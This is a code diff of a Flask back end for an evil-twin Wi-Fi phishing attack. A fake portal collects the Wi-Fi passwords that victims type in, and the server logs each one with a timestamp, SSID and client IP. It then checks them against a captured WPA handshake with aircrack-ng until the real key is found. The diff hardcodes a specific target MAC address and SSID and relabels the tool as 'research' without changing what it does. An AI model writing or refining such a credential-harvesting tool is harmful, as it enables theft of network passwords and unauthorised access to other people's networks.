@@ -1,36 +1,44 @@
-from flask import Flask, request,jsonify, json, make_response
+from flask import Flask, request, jsonify
 from subprocess import run, PIPE
-import time,os
+import time, os
+from datetime import datetime
 
+# Configuration - will be updated by main script
 target = 'CC:2D:21:61:71:58'
+ssid_name = 'Tenda_Saad'
+handshake_file = 'Tenda_Saad.cap'
 
+# Enhanced validation
 if len(target) != 17:
-   print('[ERROR] wrong target mac address should be 17 character')
-   exit(1)
-if not 'evil.cap' in os.listdir():
-   print(f'[ERROR] evil.cap not found copy your target handshake in current folder {os.getcwd()} and name it evil.cap')
-   exit(1)
+    print('[ERROR] Invalid target MAC address format')
+    exit(1)
+if not os.path.exists(handshake_file):
+    print(f'[ERROR] {handshake_file} not found in {os.getcwd()}')
+    exit(1)
 
-app = Flask('xd-evil')
-logpass = open('attempts.txt','a')
-print('Any Attemps will be saved HERE\n\n\n', file=logpass)
-print('[INFO] Any Attemps will be saved in attempts.txt')
+app = Flask('evil-twin-research')
+
+# Research logging setup
+logpass = open('attempts.txt', 'a')
+print('[INFO] All attempts will be saved in attempts.txt with timestamps and SSID info')
 
 def checkWPA(passw):
-    wrdl = open('password.txt','w')
+    wrdl = open('password.txt', 'w')
     print(passw, file=wrdl)
     wrdl.close()
-    cmd = f"aircrack-ng evil.cap -b '{target}' -w password.txt"
-    out = run(cmd,stdout=PIPE,shell=True)
+    cmd = f"aircrack-ng {handshake_file} -b '{target}' -w password.txt"
+    out = run(cmd, stdout=PIPE, shell=True)
     output = out.stdout
     code = out.returncode
-    print(output,code)
+    
     if "KEY NOT FOUND" in str(output):
-       return False
+        return False
     elif "KEY FOUND" in str(output):
-       return True
-    elif "ERROR" in str(output): return False
-    else: return None
+        return True
+    elif "ERROR" in str(output): 
+        return False
+    else: 
+        return None
 
 @app.before_request
 def log_request():
@@ -40,27 +48,28 @@ def log_request():
 @app.route("/pass", methods=['POST'])
 def hello_world():
     passw = request.form["pass"]
-    print(passw)
-    print(passw, file=logpass)
-    results = checkWPA(passw)
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    client_ip = request.remote_addr
+    
+    # Enhanced research logging with timestamp and SSID
+    log_entry = f"{timestamp} | SSID: {ssid_name} | Password: {passw} | IP: {client_ip}"
+    print(log_entry, file=logpass)
     logpass.flush()
+    
+    results = checkWPA(passw)
+    
     if results:
-       response = jsonify(status="All good")
-       response.headers.add("Access-Control-Allow-Origin", "*")
-       return response
-
+        response = jsonify(status="All good")
+        response.headers.add("Access-Control-Allow-Origin", "*")
+        return response
     else:
-       response = jsonify(status="notgood")
-       response.headers.add("Access-Control-Allow-Origin", "*")
-#       print(response)
-       return response
-
+        response = jsonify(status="notgood")
+        response.headers.add("Access-Control-Allow-Origin", "*")
+        return response
 
 @app.after_request
 def after(response):
-    # todo with response
     print(response.status)
-#    print(response.headers)
     print(response.get_data())
     return response
 
